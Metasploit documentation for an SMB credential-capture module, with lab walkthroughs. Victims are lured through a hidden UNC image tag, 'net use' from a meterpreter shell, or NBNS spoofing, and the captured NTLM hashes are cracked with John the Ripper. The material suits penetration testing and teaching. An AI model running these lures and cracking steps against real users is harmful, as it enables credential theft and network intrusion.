{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/server/capture/smb","result":{"data":{"moduleMetadataJson":{"id":"340ab624-c8ee-5ea4-aa85-19bb0d86ec68","name":"Authentication Capture: SMB","fullname":"auxiliary/server/capture/smb","description":"This module provides a SMB service that can be used to capture the\n        challenge-response password hashes of SMB client systems. Responses\n        sent by this service have by default the configurable challenge string\n        (\\x11\\x22\\x33\\x44\\x55\\x66\\x77\\x88), allowing for easy cracking using\n        Cain & Abel, L0phtcrack or John the ripper (with jumbo patch).\n\n        To exploit this, the target system must try to authenticate to this\n        module. One way to force an SMB authentication attempt is by embedding\n        a UNC path (\\\\SERVER\\SHARE) into a web page or email message. When\n        the victim views the web page or email, their system will\n        automatically connect to the server specified in the UNC share (the IP\n        address of the system running this module) and attempt to\n        authenticate. Another option is using auxiliary/spoof/{nbns,llmnr} to\n        respond to queries for names the victim is already looking for.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/server/capture/smb","documentationSlug":"/modules/documentation/auxiliary/server/capture/smb"},"documentation":{"html":"<p>This module creates a mock SMBv1 server which accepts credentials before returning <code class=\"language-text\">NT_STATUS_LOGON_FAILURE</code>.</p>\n<p>SMBv1 is enabled by default on systems before, and including:</p>\n<ul>\n<li>Windows XP</li>\n<li>Windows Server 2008 R2</li>\n</ul>\n<p>Microsoft provides an article on how to detect, disable, and enable SMB in various versions\n<a href=\"https://support.microsoft.com/en-us/help/2696547/detect-enable-disable-smbv1-smbv2-smbv3-in-windows-and-windows-server\">here</a></p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use auxiliary/server/capture/smb</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>CAINPWFILE</strong></p>\n<p>  A file to store Cain &#x26; Abel formatted captured hashes in</p>\n<p>  <strong>CHALLENGE</strong></p>\n<p>  An 8 byte server challenge.  Default is <code class=\"language-text\">1122334455667788</code></p>\n<p>  <strong>JOHNPWFILE</strong></p>\n<p>  A file to store John the Ripper formatted hashes in</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"linux-connection-via-smbclient\" style=\"position:relative;\"><a href=\"#linux-connection-via-smbclient\" aria-label=\"linux connection via smbclient permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Linux Connection via smbclient</h3>\n<p>Ubuntu 18.04 with <code class=\"language-text\">smbclient 4.7.6-Ubuntu</code> installed.</p>\n<p>Based on <a href=\"https://www.shellvoide.com/hacks/how-to-setup-rogue-fake-smb-server-to-capture-credentials/\">shellvoide.com</a></p>\n<p>You'll need to set <code class=\"language-text\">client use spnego = no</code> under <code class=\"language-text\">[global]</code> in <code class=\"language-text\">smb.conf</code> to ensure SMBv1 compatibility.</p>\n<p>Server:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(multi/handler) &gt; use auxiliary/server/capture/smb\nmsf5 auxiliary(server/capture/smb) &gt; set johnpwfile /tmp/john\njohnpwfile =&gt; /tmp/john\nmsf5 auxiliary(server/capture/smb) &gt; run\n[*] Auxiliary module running as background job 0.\n[*] SMB Captured - 2019-09-25 22:44:04 -0400\nNTLMv2 Response Captured from 2.2.2.2:50978 - 2.2.2.2\nUSER:ubuntu DOMAIN:WORKGROUP OS:Unix LM:Samba\nLMHASH:Disabled \nLM_CLIENT_CHALLENGE:Disabled\nNTHASH:a6b70b49c8d42903fbe6231ce53a21ff \nNT_CLIENT_CHALLENGE:01010000000000008aee33441474d501f8f62d51f6995359000000000200120057004f0052004b00470052004f005500500000000000\n[*] SMB Capture - Empty hash captured from 2.2.2.2:50978 - 2.2.2.2 captured, ignoring ... </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Client:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">root@Kali:~# grep spnego /etc/samba/smb.conf \nclient use spnego = no\nroot@Kali:~# smbclient //1.1.1.1/fake\nEnter WORKGROUP\\root&#39;s password: \nsession setup failed: NT_STATUS_LOGON_FAILURE</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Crack the Hash:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\"># cat /tmp/john_netntlmv2\nubuntu::WORKGROUP:1122334455667788:a6b70b49c8d42903fbe6231ce53a21ff:01010000000000008aee33441474d501f8f62d51f6995359000000000200120057004f0052004b00470052004f005500500000000000\n# john /tmp/john_netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])\nWill run 8 OpenMP threads\nPress &#39;q&#39; or Ctrl-C to abort, almost any other key for status\ntest             (ubuntu)\n1g 0:00:00:00 DONE (2019-09-25 22:46) 11.11g/s 1865Kp/s 1865Kc/s 1865KC/s 24782478..playpen\nUse the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably\nSession completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"windows-xp-via-net-use\" style=\"position:relative;\"><a href=\"#windows-xp-via-net-use\" aria-label=\"windows xp via net use permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows XP via net use</h3>\n<p>Method also confirmed on Windows 2008r2</p>\n<p>Based off of <a href=\"https://www.hackers-arise.com/single-post/2018/11/19/Metasploit-Basics-Part-20-Creating-a-Fake-SMB-Server-to-Capture-Credentials\">hackers-arise.com</a></p>\n<p>The idea here is we have a shell on a Windows box where we can't <code class=\"language-text\">hashdump</code> due to user permissions.\nHowever, we're able to do a <code class=\"language-text\">net use</code> to make an <code class=\"language-text\">SMB</code> connection back to our server to get the\nuser's hash, then hopefully crack it.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; getuid\nServer username: WINXP\\test\nmeterpreter &gt; hashdump\n[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.\nmeterpreter &gt; background\n[*] Backgrounding session 1...\nmsf5 exploit(multi/handler) &gt; use auxiliary/server/capture/smb\nmsf5 auxiliary(server/capture/smb) &gt; set johnpwfile /tmp/john\njohnpwfile =&gt; /tmp/john\nmsf5 auxiliary(server/capture/smb) &gt; run\n[*] Auxiliary module running as background job 0.\nmsf5 auxiliary(server/capture/smb) &gt; \n[*] Started service listener on 0.0.0.0:445 \n[*] Server started.\n\nmsf5 auxiliary(server/capture/smb) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; shell\nProcess 892 created.\nChannel 1 created.\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\n\nC:\\Documents and Settings\\test\\Desktop&gt;net use \\\\1.1.1.1 fake\n\n[*] SMB Captured - 2019-09-25 22:26:04 -0400\nNTLMv1 Response Captured from 2.2.2.2:1056 - 2.2.2.2\nUSER:test DOMAIN:WINXP OS:Windows 2002 Service Pack 2 2600 LM:Windows 2002 5.1\nLMHASH:7f1a8bbdf965d969339b08f160d292692f85252cc731bb25\nNTHASH:e02333eb6ac047b8d4d4f5759b1a455161d4bc576f75460c\nnet use \\\\1.1.1.1 fake\nSystem error 1326 has occurred.\n\nLogon failure: unknown user name or bad password.\n\n\nC:\\Documents and Settings\\test\\Desktop&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>We're now able to use John the Ripper to crack the password.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\"># cat /tmp/john_netntlm \ntest::WINXP:7f1a8bbdf965d969339b08f160d292692f85252cc731bb25:e02333eb6ac047b8d4d4f5759b1a455161d4bc576f75460c:1122334455667788\n# john /tmp/john_netntlm --format=netlm  --wordlist=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nUsing default target encoding: CP850\nLoaded 1 password hash (netlm, LM C/R [DES 32/64])\nWarning: poor OpenMP scalability for this hash type, consider --fork=8\nWill run 8 OpenMP threads\nPress &#39;q&#39; or Ctrl-C to abort, almost any other key for status\nFAKE             (test)\n1g 0:00:00:00 DONE (2019-09-25 22:28) 1.333g/s 1398Kp/s 1398Kc/s 1398KC/s 123456..LATISHA1\nUse the &quot;--show --format=netlm&quot; options to display all of the cracked passwords reliably\nSession completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"unc-in-websites-vector\" style=\"position:relative;\"><a href=\"#unc-in-websites-vector\" aria-label=\"unc in websites vector permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>UNC in Websites Vector</h3>\n<p>One way to coax a user into creating an SMB connection is to embed it in a website</p>\n<p>First, create the website (we're using Kali for this) with the following content:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;UNC Example&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;img src=&quot;file:////1.1.1.1/fake.jpg&quot; width=&quot;0px&quot; height=&quot;0px&quot;&gt;\n&lt;/body&gt;\n&lt;/html&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>This file, for the example is in <code class=\"language-text\">/var/www/html/unc.html</code>.</p>\n<p>Also of note, this could be done via XSS or other injection technique.</p>\n<p>Start the webserver: <code class=\"language-text\">service apache2 start</code></p>\n<p>Server:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use auxiliary/server/capture/smb\nmsf5 auxiliary(server/capture/smb) &gt; set johnpwfile /tmp/john\njohnpwfile =&gt; /tmp/john\nmsf5 auxiliary(server/capture/smb) &gt; run\n[*] Auxiliary module running as background job 0.\nmsf5 auxiliary(server/capture/smb) &gt; \n[*] Started service listener on 0.0.0.0:445 \n[*] Server started.\n[*] SMB Captured - 2019-09-26 14:01:37 -0400\nNTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2\nUSER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:\nLMHASH:Disabled \nLM_CLIENT_CHALLENGE:Disabled\nNTHASH:957c33ac7e9d7bf4459ddb2c65109aaa \nNT_CLIENT_CHALLENGE:01010000000000007a7e22719474d5014eb86a13abf5f61000000000020000000000000000000000\n[*] SMB Captured - 2019-09-26 14:01:37 -0400\nNTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2\nUSER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:\nLMHASH:Disabled \nLM_CLIENT_CHALLENGE:Disabled\nNTHASH:e4411aead169063032e832539864b4ff \nNT_CLIENT_CHALLENGE:0101000000000000fd0e3f719474d501ed3acc4801283dee00000000020000000000000000000000\n[*] SMB Captured - 2019-09-26 14:01:37 -0400\nNTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2\nUSER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:\nLMHASH:Disabled \nLM_CLIENT_CHALLENGE:Disabled\nNTHASH:f09d780a73410902dae21653cc9ef117 \nNT_CLIENT_CHALLENGE:0101000000000000bed143719474d5015e71b1d1c6aba91800000000020000000000000000000000\n[*] SMB Captured - 2019-09-26 14:01:37 -0400\nNTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2\nUSER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:\nLMHASH:Disabled \nLM_CLIENT_CHALLENGE:Disabled\nNTHASH:b9f84605b6cd0feb57c38f5d7251d5e0 \nNT_CLIENT_CHALLENGE:01010000000000007f9448719474d50164270f62c422d35200000000020000000000000000000000\n[*] SMB Captured - 2019-09-26 14:01:37 -0400\nNTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2\nUSER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:\nLMHASH:Disabled \nLM_CLIENT_CHALLENGE:Disabled\nNTHASH:a1f2d3c84c444368bea5cac47707faec \nNT_CLIENT_CHALLENGE:01010000000000003f574d719474d50197b541b568bd9d3600000000020000000000000000000000\n[*] SMB Captured - 2019-09-26 14:01:37 -0400\nNTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2\nUSER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:\nLMHASH:Disabled \nLM_CLIENT_CHALLENGE:Disabled\nNTHASH:b895915d8c813c99512904bd1b84f2e2 \nNT_CLIENT_CHALLENGE:0101000000000000001a52719474d501b8fa9400bb1ff22f00000000020000000000000000000000\n[*] SMB Captured - 2019-09-26 14:01:37 -0400\nNTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2\nUSER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:\nLMHASH:Disabled \nLM_CLIENT_CHALLENGE:Disabled\nNTHASH:309c3abcd382e8541a811a8d9af66002 \nNT_CLIENT_CHALLENGE:0101000000000000c0dc56719474d501cea04f59f7a5dc5a00000000020000000000000000000000\n[*] SMB Captured - 2019-09-26 14:01:37 -0400\nNTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2\nUSER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:\nLMHASH:Disabled \nLM_CLIENT_CHALLENGE:Disabled\nNTHASH:1378542b978996b23f6f88c8d52b3d22 \nNT_CLIENT_CHALLENGE:0101000000000000819f5b719474d501cd5954986a11cd6600000000020000000000000000000000\n[*] SMB Captured - 2019-09-26 14:01:37 -0400\nNTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2\nUSER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:\nLMHASH:Disabled \nLM_CLIENT_CHALLENGE:Disabled\nNTHASH:425740c14d740ba89aae0533e1c320bb \nNT_CLIENT_CHALLENGE:0101000000000000416260719474d501dc6bac2b5637209b00000000020000000000000000000000\n[*] SMB Captured - 2019-09-26 14:01:37 -0400\nNTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2\nUSER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:\nLMHASH:Disabled \nLM_CLIENT_CHALLENGE:Disabled\nNTHASH:b291ca93971c18c3fa3f9789c25296c8 \nNT_CLIENT_CHALLENGE:0101000000000000022565719474d501d583f2f3dbf2ea0000000000020000000000000000000000\n[*] SMB Captured - 2019-09-26 14:01:37 -0400\nNTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2\nUSER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:\nLMHASH:Disabled \nLM_CLIENT_CHALLENGE:Disabled\nNTHASH:3a908e59fe9f96a7f871b3aa2155dce1 \nNT_CLIENT_CHALLENGE:0101000000000000c2e769719474d5015e8a4d8a139e8eea00000000020000000000000000000000\n[*] SMB Captured - 2019-09-26 14:01:37 -0400\nNTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2\nUSER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:\nLMHASH:Disabled \nLM_CLIENT_CHALLENGE:Disabled\nNTHASH:2a76fc76174c297712b08e301ac1b08e \nNT_CLIENT_CHALLENGE:010100000000000083aa6e719474d5019684d5d78475e27500000000020000000000000000000000\n[*] SMB Captured - 2019-09-26 14:01:37 -0400\nNTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2\nUSER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:\nLMHASH:Disabled \nLM_CLIENT_CHALLENGE:Disabled\nNTHASH:5d7057563a44671ec26ec021613f45b4 \nNT_CLIENT_CHALLENGE:0101000000000000a4ce75719474d50184900d6f208cb07500000000020000000000000000000000\n[*] SMB Captured - 2019-09-26 14:01:37 -0400\nNTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2\nUSER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:\nLMHASH:Disabled \nLM_CLIENT_CHALLENGE:Disabled\nNTHASH:ec6ce9d5171e9f5ee017d963797e760c \nNT_CLIENT_CHALLENGE:010100000000000064917a719474d501006e93848f1fb88100000000020000000000000000000000\n[*] SMB Captured - 2019-09-26 14:01:37 -0400\nNTLMv2 Response Captured from 2.2.2.2:49160 - 2.2.2.2\nUSER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:\nLMHASH:Disabled \nLM_CLIENT_CHALLENGE:Disabled\nNTHASH:d96937debde3ce251f6889fc1be21a2f \nNT_CLIENT_CHALLENGE:010100000000000025547f719474d5014dd729fda10cf20c00000000020000000000000000000000</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Client:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">Browse to the webpage.  This example is on Windows Server 2008r2 with Internet Explorer.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Crack the password:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\"># john /tmp/john_netntlmv2 -wordlist=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 17 password hashes with 17 different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])\nRemaining 15 password hashes with 15 different salts\nWill run 8 OpenMP threads\nPress &#39;q&#39; or Ctrl-C to abort, almost any other key for status\nPassword123      (Administrator)\nPassword123      (Administrator)\nPassword123      (Administrator)\nPassword123      (Administrator)\nPassword123      (Administrator)\nPassword123      (Administrator)\nPassword123      (Administrator)\nPassword123      (Administrator)\nPassword123      (Administrator)\nPassword123      (Administrator)\nPassword123      (Administrator)\nPassword123      (Administrator)\nPassword123      (Administrator)\nPassword123      (Administrator)\nPassword123      (Administrator)\n15g 0:00:00:00 DONE (2019-09-26 14:06) 115.3g/s 283569p/s 4253Kc/s 4253KC/s dyesebel..holaz\nUse the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably\nSession completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"spoofing-nbns\" style=\"position:relative;\"><a href=\"#spoofing-nbns\" aria-label=\"spoofing nbns permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Spoofing NBNS</h3>\n<p>If the target(s) are on the local network, it's possible to conduct an <code class=\"language-text\">nbns</code> spoof to attract\nadditional SMB queries to your host.  This scenario will utilize <code class=\"language-text\">auxiliary/spoof/nbns/nbns_response</code>\nto conduct the spoofing.  If a Windows user attempts to browse or mount a network name such as\n<code class=\"language-text\">\\\\fake</code>, the <code class=\"language-text\">nbns</code> module will respond back with the set IP.</p>\n<p>This is based on <a href=\"https://www.hackingarticles.in/4-ways-capture-ntlm-hashes-network/\">hackingarticles.in</a></p>\n<p>Server side:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use auxiliary/server/capture/smb\nmsf5 auxiliary(server/capture/smb) &gt; set johnpwfile /tmp/johnnbns\njohnpwfile =&gt; /tmp/johnnbns\nmsf5 auxiliary(server/capture/smb) &gt; run\n[*] Auxiliary module running as background job 0.\nmsf5 auxiliary(server/capture/smb) &gt; \n[*] Started service listener on 0.0.0.0:445 \n[*] Server started.\n\nmsf5 auxiliary(server/capture/smb) &gt; use auxiliary/spoof/nbns/nbns_response\nmsf5 auxiliary(spoof/nbns/nbns_response) &gt; set spoofip 1.1.1.1\nspoofip =&gt; 1.1.1.1\nmsf5 auxiliary(spoof/nbns/nbns_response) &gt; set interface eth0\ninterface =&gt; eth0\nmsf5 auxiliary(spoof/nbns/nbns_response) &gt; exploit\n[*] Auxiliary module running as background job 1.\nmsf5 auxiliary(spoof/nbns/nbns_response) &gt; \n[*] NBNS Spoofer started. Listening for NBNS requests with REGEX &quot;.*&quot; ...\n[+] 2.2.2.2    nbns - FAKE matches regex, responding with 1.1.1.1\n[+] 2.2.2.2    nbns - FAKE matches regex, responding with 1.1.1.1\n[*] SMB Captured - 2019-09-26 16:19:09 -0400\nNTLMv2 Response Captured from 2.2.2.2:49161 - 2.2.2.2\nUSER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:\nLMHASH:Disabled \nLM_CLIENT_CHALLENGE:Disabled\nNTHASH:5a44b22db99861330e1637f0565f595f \nNT_CLIENT_CHALLENGE:010100000000000022529fa7a774d501b3b3f093392560d600000000020000000000000000000000\n[*] SMB Captured - 2019-09-26 16:19:09 -0400\nNTLMv2 Response Captured from 2.2.2.2:49161 - 2.2.2.2\nUSER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:\nLMHASH:Disabled \nLM_CLIENT_CHALLENGE:Disabled\nNTHASH:00837cb572f0116c7544ca0f56d31f5c \nNT_CLIENT_CHALLENGE:0101000000000000c606c3a7a774d501c28ee74be786099100000000020000000000000000000000\n[*] SMB Captured - 2019-09-26 16:19:09 -0400\nNTLMv2 Response Captured from 2.2.2.2:49161 - 2.2.2.2\nUSER:Administrator DOMAIN:WIN-O712LQK2K69 OS: LM:\nLMHASH:Disabled \nLM_CLIENT_CHALLENGE:Disabled\nNTHASH:b571090dea4270b6b6d2b3de39321b29 \nNT_CLIENT_CHALLENGE:010100000000000087c9c7a7a774d501c00e467bda8a8b4a00000000020000000000000000000000\n[*] SMB Captured - 2019-09-26 16:19:09 -0400\nNTLMv2 Response Captured from 2.2.2.2:49161 - 2.2.2.2\nUSER:Administrator 